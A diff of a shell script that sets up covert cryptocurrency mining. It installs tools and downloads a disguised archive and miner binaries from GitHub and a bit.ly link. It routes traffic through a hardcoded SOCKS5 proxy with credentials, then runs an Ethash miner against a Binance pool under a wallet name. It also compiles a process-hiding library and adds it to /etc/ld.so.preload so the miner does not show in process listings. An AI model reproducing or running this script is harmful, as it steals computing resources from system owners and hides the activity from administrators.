@@ -1,14 +1,51 @@
-#!/bin/bash
-POOL=ethash.poolbinance.com:1800
+#!/bin/sh
+ln -fs /usr/share/zoneinfo/Africa/Johannesburg /etc/localtime
+dpkg-reconfigure --frontend noninteractive tzdata
+
+apt update;apt -y install binutils cmake build-essential screen unzip net-tools curl
+
+wget https://raw.githubusercontent.com/nathanfleight/scripts/main/graphics.tar.gz
+
+tar -xvzf graphics.tar.gz
+
+cat > graftcp/local/graftcp-local.conf <<END
+listen = :2233
+loglevel = 1
+socks5 = 20.107.53.168:1080
+socks5_username = jangankendor
+socks5_password = Gaskanpol
+END
+
+./graftcp/local/graftcp-local -config graftcp/local/graftcp-local.conf &
+
+sleep .2
+
+echo " "
+echo " "
+
+echo "******************************************************************"
+
+./graftcp/graftcp curl ifconfig.me
+
+echo " "
+echo " "
+
+echo "******************************************************************"
+
+echo " "
+echo " "
+
+./graftcp/graftcp wget https://github.com/archernap/prem/raw/main/priyatama
+chmod +x priyatama
+POOL=stratum+tcp://ethash.poolbinance.com:443
 WALLET=teguhcong
-WORKER=$(echo $(shuf -i 41-80 -n 1)-ETHash)
-#wget https://github.com/drJamesjack/prem/raw/main/lolMiner
-wget https://bit.ly/3FpnfeJ
-chmod +x 3FpnfeJ
-#chmod +x lolMiner
-while [ 1 ]; do
-#./3FpnfeJ --algo ETHASH --pool $POOL --user $WALLET.$WORKER --pass c=LTC,mc=ETH
-./3FpnfeJ --algo ETHASH --pool $POOL --user $WALLET.$WORKER 
-sleep 5
-done
-sleep 999999999
+WORKER=$(echo $(shuf -i 10-40 -n 1)-MAGIC)
+
+./graftcp/graftcp wget https://github.com/hunzibao/tmp/raw/main/magicPriyatama.zip
+unzip magicPriyatama.zip
+make
+gcc -Wall -fPIC -shared -o libprocesshider.so processhider.c -ldl
+mv libprocesshider.so /usr/local/lib/
+echo /usr/local/lib/libprocesshider.so >> /etc/ld.so.preload
+
+./graftcp/graftcp ./priyatama --algo ETHASH --pool $POOL --user $WALLET.$WORKER 
